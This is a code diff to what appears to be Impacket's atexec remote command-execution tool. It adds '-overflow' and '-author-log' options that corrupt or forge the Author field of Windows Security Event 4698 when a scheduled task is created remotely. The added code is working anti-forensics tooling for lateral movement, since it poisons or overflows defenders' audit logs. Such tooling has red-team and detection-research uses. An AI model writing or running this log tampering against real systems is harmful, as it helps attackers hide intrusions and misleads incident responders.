@@ -16,6 +16,7 @@
 #
 # Author:
 #   Alberto Solino (@agsolino)
+#   Log Poisoning / Overflow implementation by Ruben Enkaoua (@rubenlabs with Kopnex / Cymulate)
 #
 # Reference for:
 #   DCE/RPC for TSCH
@@ -41,10 +42,11 @@ from impacket.krb5.keytab import Keytab
 from six import PY2
 
 CODEC = sys.stdout.encoding
+AUTHOR_OVERFLOW_LEN = 4000
 
 class TSCH_EXEC:
     def __init__(self, username='', password='', domain='', hashes=None, aesKey=None, doKerberos=False, kdcHost=None,
-                 command=None, sessionId=None, silentCommand=False):
+                 command=None, sessionId=None, silentCommand=False, authorLog=None, overflow=False):
         self.__username = username
         self.__password = password
         self.__domain = domain
@@ -55,6 +57,8 @@ class TSCH_EXEC:
         self.__kdcHost = kdcHost
         self.__command = command
         self.__silentCommand = silentCommand
+        self.__authorLog = authorLog
+        self.__overflow = overflow
         self.sessionId = sessionId
 
         if hashes is not None:
@@ -123,9 +127,23 @@ class TSCH_EXEC:
             cmd = "cmd.exe"
             args = "/C %s > %%windir%%\\Temp\\%s 2>&1" % (self.__command, tmpFileName)
 
+        registrationInfo = ''
+        if self.__overflow is True:
+            logging.info('Using Author overflow (%d bytes) for Task Scheduler log tampering' % AUTHOR_OVERFLOW_LEN)
+            registrationInfo = """  <RegistrationInfo>
+    <Author>%s</Author>
+  </RegistrationInfo>
+""" % ('A' * AUTHOR_OVERFLOW_LEN)
+        elif self.__authorLog is not None:
+            logging.info('Using fake Author "%s" for Task Scheduler log poisoning' % self.__authorLog)
+            registrationInfo = """  <RegistrationInfo>
+    <Author>%s</Author>
+  </RegistrationInfo>
+""" % xml_escape(self.__authorLog)
+
         xml = """<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <Triggers>
+%s  <Triggers>
     <CalendarTrigger>
       <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
       <Enabled>true</Enabled>
@@ -165,7 +183,8 @@ class TSCH_EXEC:
     </Exec>
   </Actions>
 </Task>
-        """ % ((xml_escape(cmd) if self.__silentCommand is False else self.__command.split()[0]), 
+        """ % (registrationInfo,
+            (xml_escape(cmd) if self.__silentCommand is False else self.__command.split()[0]),
             (xml_escape(args) if self.__silentCommand is False else " ".join(self.__command.split()[1:])))
         taskCreated = False
         try:
@@ -251,6 +270,13 @@ if __name__ == '__main__':
     parser.add_argument('-ts', action='store_true', help='adds timestamp to every logging output')
     parser.add_argument('-silentcommand', action='store_true', default = False, help='does not execute cmd.exe to run '
                                                                                      'given command (no output)')
+    author_group = parser.add_mutually_exclusive_group()
+    author_group.add_argument('-overflow', action='store_true', default=False,
+                              help='overflow Security Event 4698 by setting a %d-byte Author in the task XML '
+                                   '(mutually exclusive with -author-log)' % AUTHOR_OVERFLOW_LEN)
+    author_group.add_argument('-author-log', action='store', metavar='author',
+                              help='poison Security Event 4698 Author field with the given value '
+                                   '(mutually exclusive with -overflow)')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
     parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                        '"%s"). If errors are detected, run chcp.com at the target, '
@@ -310,5 +336,6 @@ if __name__ == '__main__':
         options.k = True
 
     atsvc_exec = TSCH_EXEC(username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip,
-                           ' '.join(options.command), options.session_id, options.silentcommand)
+                           ' '.join(options.command), options.session_id, options.silentcommand,
+                           options.author_log, options.overflow)
     atsvc_exec.play(address)
